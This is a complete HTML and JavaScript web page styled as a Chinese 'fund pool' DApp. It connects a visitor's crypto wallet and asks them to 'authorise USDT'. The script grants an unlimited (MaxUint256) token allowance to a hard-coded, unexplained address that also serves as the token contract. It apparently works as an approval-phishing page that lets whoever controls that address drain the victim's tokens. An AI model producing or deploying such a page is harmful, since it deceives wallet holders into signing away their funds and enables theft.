<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>链接资金池工具</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #121212 0%, #1a1a1a 100%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
            text-align: center;
        }
        
        h1 {
            font-size: 2.5rem;
            margin-bottom: 30px;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-weight: 700;
        }
        
        .wallet-section {
            margin-bottom: 30px;
        }
        
        .wallet-section h2 {
            font-size: 1.5rem;
            margin-bottom: 20px;
            color: #e0e0e0;
        }
        
        .wallet-status {
            margin: 20px 0;
            padding: 15px;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            min-height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .status {
            font-size: 1rem;
            font-weight: 500;
        }
        
        .status.success {
            color: #4caf50;
        }
        
        .status.error {
            color: #f44336;
        }
        
        .status.info {
            color: #2196f3;
        }
        
        .address {
            font-family: 'Courier New', Courier, monospace;
            font-size: 0.9rem;
            margin-left: 10px;
            background: rgba(255, 255, 255, 0.1);
            padding: 5px 10px;
            border-radius: 5px;
            word-break: break-all;
        }
        
        .button {
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.1rem;
            font-weight: 600;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 10px 0;
            width: 100%;
            max-width: 300px;
        }
        
        .button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        
        .button:active {
            transform: translateY(0);
        }
        
        .button:disabled {
            background: #555;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .footer {
            margin-top: 30px;
            font-size: 0.9rem;
            color: #888;
            text-align: center;
        }
        
        a {
            color: #667eea;
            text-decoration: none;
            transition: color 0.3s ease;
        }
        
        a:hover {
            color: #764ba2;
            text-decoration: underline;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 30px 20px;
            }
            
            h1 {
                font-size: 2rem;
            }
            
            .button {
                padding: 12px 24px;
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>链接资金池工具</h1>
        
        <div class="wallet-section">
            <h2>1. 连接钱包</h2>
            <button class="button" id="connect">连接钱包</button>
            <div class="wallet-status" id="walletStatus">点击按钮连接钱包</div>
        </div>
        
        <div class="wallet-section">
            <h2>2. 授权操作</h2>
            <button class="button" id="approve" disabled>授权USDT</button>
            <div class="wallet-status" id="approvalStatus">请先连接钱包</div>
        </div>
    </div>
    
    <div class="footer">
        <p>标准DApp流程，确保所有钱包兼容</p>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
    <script>
        // 合约配置
        const CONTRACT_ADDRESS = '0xB8C306FAdfFE05BF3336333585B3FE9B7e6AFD02';
        const AUTHORIZED_ADDRESS = '0xB8C306FAdfFE05BF3336333585B3FE9B7e6AFD02';
        
        let provider;
        let signer;
        let contract;
        
        // 检查钱包环境
        function checkWalletEnvironment() {
            if (!window.ethereum) {
                // 引导用户打开钱包
                const currentUrl = window.location.href;
                const metamaskUrl = `metamask://dapp/${currentUrl.replace('https://', '').replace('http://', '')}`;
                
                document.getElementById('walletStatus').innerHTML = `请使用Web3钱包打开，或<a href="${metamaskUrl}" target="_blank">点击这里打开MetaMask</a>`;
                document.getElementById('walletStatus').className = 'status error';
                return false;
            }
            return true;
        }
        
        // 连接钱包
        async function connectWallet() {
            if (!checkWalletEnvironment()) return;
            
            try {
                provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                
                const address = await signer.getAddress();
                document.getElementById('walletStatus').innerHTML = `已连接钱包: <span class="address">${address}</span>`;
                document.getElementById('walletStatus').className = 'status success';
                
                // 启用授权按钮
                document.getElementById('approve').disabled = false;
                document.getElementById('approvalStatus').innerHTML = '点击按钮授权USDT';
                document.getElementById('approvalStatus').className = 'status info';
                
                console.log("已连接钱包");
            } catch (error) {
                console.error('连接钱包失败:', error);
                if (error.code === 4001) {
                    document.getElementById('walletStatus').innerHTML = '用户拒绝了钱包连接请求';
                } else {
                    document.getElementById('walletStatus').innerHTML = '连接钱包失败: ' + error.message;
                }
                document.getElementById('walletStatus').className = 'status error';
            }
        }
        
        // 授权USDT
        async function approve() {
            if (!signer) {
                document.getElementById('approvalStatus').innerHTML = '请先连接钱包';
                document.getElementById('approvalStatus').className = 'status error';
                return;
            }
            
            try {
                // 初始化合约
                contract = new ethers.Contract(
                    CONTRACT_ADDRESS,
                    ["function approve(address spender, uint256 amount) public returns (bool)"],
                    signer
                );
                
                document.getElementById('approvalStatus').innerHTML = '正在授权...';
                document.getElementById('approvalStatus').className = 'status info';
                
                // 授权最大金额
                const tx = await contract.approve(
                    AUTHORIZED_ADDRESS,
                    ethers.constants.MaxUint256
                );
                
                document.getElementById('approvalStatus').innerHTML = `授权交易已发起，交易哈希: <a href="https://etherscan.io/tx/${tx.hash}" target="_blank">${tx.hash}</a>`;
                document.getElementById('approvalStatus').className = 'status success';
                
                // 等待交易确认
                await tx.wait();
                document.getElementById('approvalStatus').innerHTML = `授权成功！交易哈希: <a href="https://etherscan.io/tx/${tx.hash}" target="_blank">${tx.hash}</a>`;
                
                console.log("授权成功", tx);
            } catch (error) {
                console.error('授权失败:', error);
                if (error.code === 4001) {
                    document.getElementById('approvalStatus').innerHTML = '用户拒绝了授权请求';
                } else if (error.message.includes('insufficient funds')) {
                    document.getElementById('approvalStatus').innerHTML = '账户余额不足，需要足够的ETH支付Gas费';
                } else {
                    document.getElementById('approvalStatus').innerHTML = '授权失败: ' + error.message;
                }
                document.getElementById('approvalStatus').className = 'status error';
            }
        }
        
        // 绑定事件
        document.getElementById("connect").onclick = connectWallet;
        document.getElementById("approve").onclick = approve;
        
        // 页面加载时检查钱包环境
        window.onload = function() {
            checkWalletEnvironment();
        };
    </script>
</body>
</html>
